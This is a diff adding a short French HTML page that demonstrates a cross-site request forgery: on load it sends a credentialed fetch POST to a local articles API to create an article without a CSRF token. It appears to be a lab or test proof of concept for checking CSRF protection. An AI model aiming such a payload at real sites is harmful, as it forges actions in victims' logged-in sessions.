@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="fr">
+<body>
+<script>
+    fetch('http://localhost:3000/api/articles', {
+        method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            title: 'CSRF via fetch',
+            content: 'Article injecté malgré absence de token'
+        })
+    });
+</script>
+<p>L’attaque CSRF vient d’être lancée…</p>
+</body>
+</html>
